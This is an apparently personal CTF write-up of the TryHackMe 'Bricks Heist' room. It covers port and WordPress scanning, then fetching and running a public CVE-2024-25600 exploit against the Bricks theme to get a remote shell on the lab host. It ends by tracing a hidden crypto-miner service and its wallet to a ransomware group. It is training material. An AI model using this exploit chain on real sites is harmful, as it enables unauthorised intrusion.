---
title: "CTF THM TryHack3M: Bricks Heist"
permalink: /CTFs/thm/TryHack3M-Bricks-Heist-EN
date: 2025-03-03
categories: [CTF, TryHackMe]
tags: [English, Linux, TryHackMe, CTF]
image:
  path: /assets/img/posts/ctf/thm/TryHack3M-Bricks-Heist-EN/TryHack3M-Bricks-Heist-EN.jpg
---

At first we check for open Ports
```bash
┌──(kali㉿kalivm)-[~]
└─$ nmap -p- bricks.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 10:38 EST
Nmap scan report for bricks.thm (10.10.86.115)
Host is up (0.041s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 45.62 seconds
```
### **Parameter Breakdown**
### **1. `-p-` (Scan All Ports)**
- This option tells `nmap` to scan **all 65535 ports** (from `1` to `65535`).
- By default, `nmap` only scans the **most common 1,000 ports** unless specified otherwise.
- This is useful for detecting services running on **non-standard ports**.

### **2. `bricks.thm` (Target Hostname)**
- The target being scanned.
- Likely refers to a TryHackMe machine (`bricks.thm`), which might be mapped to an IP address in `/etc/hosts`.


---

```bash
┌──(kali㉿kalivm)-[~]
└─$ nmap -A -p 22,80,443,3306 bricks.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 10:41 EST
Nmap scan report for bricks.thm (10.10.86.115)
Host is up (0.041s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9a:e9:22:6a:24:63:2b:55:d9:e5:51:dd:fa:2b:7e:75 (RSA)
|   256 9c:da:83:b4:ae:54:57:31:73:70:9d:b1:28:60:b3:33 (ECDSA)
|_  256 b4:7e:f4:93:8e:c6:60:9c:19:f7:73:89:b8:33:b1:f9 (ED25519)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/http Apache httpd
| tls-alpn: 
|   h2
|_  http/1.1
|_http-generator: WordPress 6.5
|_http-server-header: Apache
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
|_ssl-date: TLS randomness does not represent time
|_http-title: Brick by Brick
3306/tcp open  mysql    MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   39.53 ms 10.21.0.1
2   39.79 ms bricks.thm (10.10.86.115)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
```


### **31. `-A` (Aggressive Scan Mode)**
Includes multiple features:
- **OS detection** (`-O`)
- **Version detection** (`-sV`, already included)
- **Script scanning** (`-sC`, already included)
- **Traceroute** to analyze network routes

### **2. `-p 22,80,443,3306` (Port Specification)**
Scans only the specified ports:
- `22` (SSH)
- `80` (HTTP)
- `443` (HTTPS)
- `3306` (MySQL Database)

### **3. `bricks.thm` (Target Hostname)**
- The target being scanned.
- In this case, it refers to a TryHackMe machine (`bricks.thm`), likely mapped to an IP address in `/etc/hosts`.



---

Now we know that there is a "wordpress" running on port `443`.
We can use wpscan to check vor known vilnerebilitys and get mor informations.

```bash
┌──(kali㉿kalivm)-[~]
└─$ wpscan --disable-tls-checks --url https://bricks.thm/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.10.86.115]
[+] Started: Sun Mar  2 10:42:41 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Mar  2 10:42:51 2025
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.615 KB
[+] Data Received: 110.502 KB
[+] Memory used: 267.984 MB
[+] Elapsed time: 00:00:09
```

Known facts:
- Wordpress 6.5
- theme bricks 1.9.5


---
Lets google for some exploits

`wordpress bricks 1.9.5 exploit github`

result: `https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT`

Exploit found. Lets go and try it out!
```bash
┌──(kali㉿kalivm)-[~/thm]
└─$ wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/refs/heads/main/CVE-2024-25600.py


┌──(kali㉿kalivm)-[~/thm]
└─$ bin/python CVE-2024-25600.py -u https://bricks.thm/
/home/kali/thm/CVE-2024-25600.py:18: SyntaxWarning: invalid escape sequence '\ '
  color.print("""[yellow]

   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    
Coded By: K3ysTr0K3R --> Hello, Friend!

[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm/
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> ls
XXXXXXXXXX.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php

Shell> cat XXXXXXXXXX.txt
THM{XXXXXXXXXX}
```

found the first `FLAG`
---


```bash
Shell>ps faux
....
```
only garbage so we check systemd

```bash
Shell> systemctl | grep running
  proc-sys-fs-binfmt_misc.automount                loaded active     running   Arbitrary Executable File Formats File System Automount Point                
  acpid.path                                       loaded active     running   ACPI Events Check                                                            
  init.scope                                       loaded active     running   System and Service Manager                                                   
  session-c1.scope                                 loaded active     running   Session c1 of user lightdm                                                   
  accounts-daemon.service                          loaded active     running   Accounts Service                                                             
  acpid.service                                    loaded active     running   ACPI event daemon                                                            
  atd.service                                      loaded active     running   Deferred execution scheduler                                                 
  avahi-daemon.service                             loaded active     running   Avahi mDNS/DNS-SD Stack                                                      
  badr.service                                     loaded active     running   My startup script                                                            
  cron.service                                     loaded active     running   Regular background program processing daemon                                 
  cups-browsed.service                             loaded active     running   Make remote CUPS printers available locally                                  
  cups.service                                     loaded active     running   CUPS Scheduler                                                               
  dbus.service                                     loaded active     running   D-Bus System Message Bus                                                     
  getty@tty1.service                               loaded active     running   Getty on tty1                                                                
  httpd.service                                    loaded active     running   LSB: starts Apache Web Server                                                
  irqbalance.service                               loaded active     running   irqbalance daemon                                                            
  kerneloops.service                               loaded active     running   Tool to automatically collect and submit kernel crash signatures             
  lightdm.service                                  loaded active     running   Light Display Manager                                                        
  ModemManager.service                             loaded active     running   Modem Manager                                                                
  multipathd.service                               loaded active     running   Device-Mapper Multipath Device Controller                                    
  mysqld.service                                   loaded active     running   LSB: start and stop MySQL                                                    
  networkd-dispatcher.service                      loaded active     running   Dispatcher daemon for systemd-networkd                                       
  NetworkManager.service                           loaded active     running   Network Manager                                                              
  polkit.service                                   loaded active     running   Authorization Manager                                                        
  rsyslog.service                                  loaded active     running   System Logging Service                                                       
  rtkit-daemon.service                             loaded active     running   RealtimeKit Scheduling Policy Service                                        
  serial-getty@ttyS0.service                       loaded active     running   Serial Getty on ttyS0                                                        
  snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running   Service for snap application amazon-ssm-agent.amazon-ssm-agent               
  snapd.service                                    loaded active     running   Snap Daemon                                                                  
  ssh.service                                      loaded active     running   OpenBSD Secure Shell server                                                  
  switcheroo-control.service                       loaded active     running   Switcheroo Control Proxy service                                             
  systemd-journald.service                         loaded active     running   Journal Service                                                              
  systemd-logind.service                           loaded active     running   Login Service                                                                
  systemd-networkd.service                         loaded active     running   Network Service                                                              
  systemd-resolved.service                         loaded active     running   Network Name Resolution                                                      
  systemd-timesyncd.service                        loaded active     running   Network Time Synchronization                                                 
  systemd-udevd.service                            loaded active     running   udev Kernel Device Manager                                                   
  ubuntu.service                                   loaded active     running   TRYHACK3M                                                                    
  udisks2.service                                  loaded active     running   Disk Manager                                                                 
  unattended-upgrades.service                      loaded active     running   Unattended Upgrades Shutdown                                                 
  upower.service                                   loaded active     running   Daemon for power management                                                  
  user@1000.service                                loaded active     running   User Manager for UID 1000                                                    
  user@114.service                                 loaded active     running   User Manager for UID 114                                                     
  whoopsie.service                                 loaded active     running   crash report submission daemon                                               
  wpa_supplicant.service                           loaded active     running   WPA supplicant                                                               
  acpid.socket                                     loaded active     running   ACPID Listen Socket                                                          
  avahi-daemon.socket                              loaded active     running   Avahi mDNS/DNS-SD Stack Activation Socket                                    
  cups.socket                                      loaded active     running   CUPS Scheduler                                                               
  dbus.socket                                      loaded active     running   D-Bus System Message Bus Socket                                              
  multipathd.socket                                loaded active     running   multipathd control socket                                                    
  snapd.socket                                     loaded active     running   Socket activation for snappy daemon                                          
  syslog.socket                                    loaded active     running   Syslog Socket                                                                
  systemd-journald-audit.socket                    loaded active     running   Journal Audit Socket                                                         
  systemd-journald-dev-log.socket                  loaded active     running   Journal Socket (/dev/log)                                                    
  systemd-journald.socket                          loaded active     running   Journal Socket                                                               
  systemd-networkd.socket                          loaded active     running   Network Service Netlink Socket                                               
  systemd-udevd-control.socket                     loaded active     running   udev Control Socket                                                          
  systemd-udevd-kernel.socket                      loaded active     running   udev Kernel Socket                                                         
```


---

This looks interesting
`
XXXXXXXXXX.service                                   loaded active     running   TRYHACK3M
`

lets check
```bash
shell> systemctl status XXXXXXXXXX.service
● ubuntu.service - TRYHACK3M
     Loaded: loaded (/etc/systemd/system/XXXXXXXXXX.service; enabled; vendor preset: enabled)
     Active: active (running) since Sun 2025-03-02 15:58:56 UTC; 2min 11s ago
   Main PID: 2658 (nm-inet-dialog)
      Tasks: 2 (limit: 4671)
     Memory: 30.6M
     CGroup: /system.slice/ubuntu.service
             ├─2658 /lib/NetworkManager/nm-inet-dialog
             └─2659 /lib/NetworkManager/nm-inet-dialog
```
			 
---

```bash
Shell> ls -la /lib/NetworkManager/
total 8636
drwxr-xr-x   6 root root    4096 Apr  8  2024 .
drwxr-xr-x 148 root root   12288 Apr  2  2024 ..
drwxr-xr-x   2 root root    4096 Feb 27  2022 VPN
drwxr-xr-x   2 root root    4096 Apr  3  2024 conf.d
drwxr-xr-x   5 root root    4096 Feb 27  2022 dispatcher.d
-rw-r--r--   1 root root   48190 Apr 11  2024 XXXXXXXXXX.conf
-rwxr-xr-x   1 root root   14712 Feb 16  2024 nm-dhcp-helper
-rwxr-xr-x   1 root root   47672 Feb 16  2024 nm-dispatcher
-rwxr-xr-x   1 root root  843048 Feb 16  2024 nm-iface-helper
-rwxr-xr-x   1 root root 6948448 Apr  8  2024 nm-inet-dialog
-rwxr-xr-x   1 root root  658736 Feb 16  2024 nm-initrd-generator
-rwxr-xr-x   1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
-rwxr-xr-x   1 root root   59784 Mar 11  2020 nm-openvpn-service
-rwxr-xr-x   1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
-rwxr-xr-x   1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
-rwxr-xr-x   1 root root   59544 Nov 27  2018 nm-pptp-service
drwxr-xr-x   2 root root    4096 Nov 27  2021 system-connections
```

---


```bash
Shell> head /lib/NetworkManager/XXXXXXXXXX.conf
ID: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
```

---
lets check if the `ID` is interesting

`https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

this will do some magic to decrypt the ID fielts

bitcoin Walltet IDs start with `bc1` so we have two which are nearly the same

```
bc1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
bc1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

this looks great `bc1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`


there we find some transactions on https://www.blockchain.com/explorer/addresses/btc/bc1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Lets check every wallet on google. maybe we find some informations
google:
bc1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Got it!!!
https://ofac.treasury.gov/recent-actions/XXXXXX

XXXXX Ransomware Group
=> XXXXX